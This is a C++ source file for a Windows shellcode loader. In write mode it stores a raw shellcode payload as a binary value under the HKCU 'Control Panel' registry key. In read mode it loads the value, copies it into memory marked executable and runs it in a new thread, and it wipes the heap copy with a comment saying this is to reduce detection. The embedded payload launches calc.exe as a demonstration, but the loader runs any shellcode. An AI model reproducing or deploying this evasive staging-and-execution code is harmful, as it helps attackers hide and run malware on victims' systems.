// Payload_Registry.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#pragma comment (lib, "Advapi32.lib") // Used to compile RegGetValueA

//#define WRITEMODE
#define READMODE


#define     REGISTRY		"Control Panel"
#define     REGSTRING       "rds_shell"


void Write_To_Registry(unsigned char payload[], int payload_size) {
	HKEY hRegistry = NULL;

	//Opening a handle to the the Registry 
	BOOL HREG_STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hRegistry);
	if (ERROR_SUCCESS != HREG_STATUS) {
		printf("RegOpenKeyExA failed with error : %d", HREG_STATUS);
	}

	//Setting the Value to the Registry
	BOOL STRING_STATUS = RegSetValueExA(hRegistry, REGSTRING, 0, REG_BINARY, payload, payload_size);
	if (ERROR_SUCCESS != STRING_STATUS) {
		printf("RegSetValueExA failed with error : %d", STRING_STATUS);
	}

	printf("[+] Done \n");
	RegCloseKey(hRegistry);
}

void Read_Execute_From_Registry() {

	LSTATUS     STATUS = NULL;
	DWORD		bytes_read = NULL;
	PVOID		heap_shellcode = NULL;
	DWORD dwOldProtect = NULL;


	//First GetRegValueA is called without any buffer to store the value in, this gets us the no. of bytes to read from the REGISTRY VALUE
	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, NULL, &bytes_read);
	
	
	//Now the number of bytes to read is stored under bytes_read
	//Allocate a Heap of the appropriate bytes_read size
	heap_shellcode = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes_read);
	if (heap_shellcode == NULL) {
		printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());

	}

	
	//Call GetRegValueA this time with the buffer "heap_shellcode" to store the bytes 
	STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY, NULL, heap_shellcode, &bytes_read);
	if (ERROR_SUCCESS != STATUS) {
		printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);

	}

	
	//We allocate virtual memory for the same size as the number of bytes
	HANDLE pShellcode = VirtualAlloc(NULL, bytes_read, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcode == NULL) {
		printf("Virtual Alloc failed with error : %d", GetLastError());
	}


	//Move it from heap to a part of the virtual memory
	RtlMoveMemory(pShellcode, heap_shellcode, bytes_read);

	
	//Now we overwrite the heap to null bytes to reduce detection
	memset(heap_shellcode, '\0', bytes_read);

	
	//Changing the protections for the memory space
	BOOL Protect = VirtualProtect(pShellcode, 1024, PAGE_EXECUTE_READ, &dwOldProtect);
	if (!Protect) {
		printf("Virtual Protect Failed with error : %d", GetLastError());
	}

	
	//Running the Shellcode
	HANDLE Thread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pShellcode, NULL, NULL, NULL);
	if (!Thread) {
		printf("Creating Thread Failed with error : %d", GetLastError());
	}
	
	WaitForSingleObject(Thread, INFINITE);
}
	

int main()
{
#ifdef WRITEMODE

	unsigned char payload[] = "\x48\x31\xc0\x48\x31\xc9\x65\x48\x8b\x48\x60\x48\x8b\x49\x18\x48\x8b\x49\x20\x48\x8b\x09\x48\x8b\x09\x48\x8b\x49\x20\x49\x89\xca\x8b\x49\x3c\x4c\x01\xd1\x8b\x89\x88\x00\x00\x00\x4c\x01\xd1\x4d\x31\xc9\x44\x8b\x49\x1c\x4d\x01\xd1\x4d\x31\xdb\x44\x8b\x59\x20\x4d\x01\xd3\x4d\x31\xe4\x44\x8b\x61\x24\x4d\x01\xd4\x48\x31\xc9\xb9\x07\x00\x00\x00\x48\xb8\x57\x69\x6e\x45\x78\x65\x63\x00\x50\x51\xe8\x05\x00\x00\x00\x49\x89\xc6\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xd7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x81\x4c\x01\xd0\x53\xc3\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6";
	Write_To_Registry(payload, sizeof(payload));

#endif

#ifdef READMODE
	Read_Execute_From_Registry();
#endif
	return 0;
}
